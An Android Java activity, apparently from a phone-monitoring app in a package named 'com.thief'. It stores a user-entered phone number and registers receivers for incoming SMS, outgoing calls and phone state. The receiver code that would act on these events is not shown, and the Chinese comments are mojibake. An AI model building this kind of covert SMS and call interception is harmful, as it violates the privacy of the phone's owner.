package com.thief;

import android.app.Activity;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.PhoneNumberUtils;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.View.OnKeyListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
	public static String PHONENO;
	private final static String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
	private final static String NEW_OUTGOING_CALL = "android.intent.action.NEW_OUTGOING_CALL";
	private final static String PHONE_STATE = "android.intent.action.PHONE_STATE";
	private Button btnstarted = null;
	private Button btncanceled = null;
	private TextView titletips = null;
	private TextView cellinfo = null;
	private EditText cellno = null;
	private OnClickListener btnstartedClickListener = null;
	private OnClickListener btncanceledClickListener = null;
	private OnKeyListener cellnoKeyListener = null;
	
	private SmsReceiver smsreceiver;
	private DialReceiver dialreceiver;
	private CallHoldReceiver calleereceiver;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        initView();
        prepareListener();
        setListener();
    }
    /**
     * ��ʼ������
     */
    private void initView() {
    	btnstarted = (Button)findViewById( R.id.btnstarted);
    	btncanceled = (Button)findViewById(R.id.btncanceled);
    	titletips = (TextView)findViewById(R.id.titletips);
    	cellno = (EditText)findViewById(R.id.cellno);
    	cellinfo = (TextView)findViewById(R.id.cellinfo);
    	cellinfo.setText(cellinfo.getText());
    }
    /**
     * ��ʼ���¼�������
     */
    private void prepareListener() {
    	btnstartedClickListener = new OnClickListener() {

			public void onClick(View v) {
				// TODO Auto-generated method stub
				if("".equals(cellinfo.getText())) {
					Toast.makeText(MainActivity.this, "���벻��Ϊ��", Toast.LENGTH_LONG).show();
					return;
//					Bundle bundle = new Bundle();
//					bundle.putString("PHONENO", cellinfo.getText().toString());
				}else {
					PHONENO = cellinfo.getText().toString();
					//���绰����ĺϷ���
					if(PhoneNumberUtils.isGlobalPhoneNumber(PHONENO)){
					    //ע����ն���
					    IntentFilter smsreceiverfilter = new IntentFilter(SMS_RECEIVED);
					    smsreceiver = new SmsReceiver();
					    registerReceiver(smsreceiver, smsreceiverfilter);
					    //ע�Ღ��绰
					    IntentFilter dialfilter = new IntentFilter(NEW_OUTGOING_CALL);
					    dialreceiver = new DialReceiver();
					    registerReceiver(dialreceiver,dialfilter);
					    //ע������
					    IntentFilter calleefilter = new IntentFilter(PHONE_STATE);
					    calleereceiver = new CallHoldReceiver();
					    registerReceiver(calleereceiver,calleefilter);
					}else {
						return;
					}
				}
				Toast.makeText(MainActivity.this, "���óɹ�", Toast.LENGTH_LONG).show();
			}
    		
    	};
    	btncanceledClickListener = new OnClickListener(){

			public void onClick(View v) {
				// TODO Auto-generated method stub
				//ж�ض��Ž���
				unregisterReceiver(smsreceiver);
				//ж�ز���绰
				unregisterReceiver(dialreceiver);
				//ж������
				unregisterReceiver(calleereceiver);
				Toast.makeText(MainActivity.this, "ȡ���ɹ�", Toast.LENGTH_LONG).show();
			}
    		
    	};
    	cellnoKeyListener = new OnKeyListener() {

			public boolean onKey(View v, int keyCode, KeyEvent event) {
				// TODO Auto-generated method stub
				cellinfo.setText(String.valueOf(keyCode));
				cellinfo.setText(cellno.getText());
				return false;
			}
    		
    	};
    	
    }
    /**
     * ���ü�����
     */
    public void setListener() {
    	btnstarted.setOnClickListener(btnstartedClickListener);
    	btncanceled.setOnClickListener(btncanceledClickListener);
    	cellno.setOnKeyListener(cellnoKeyListener);    	
    }
}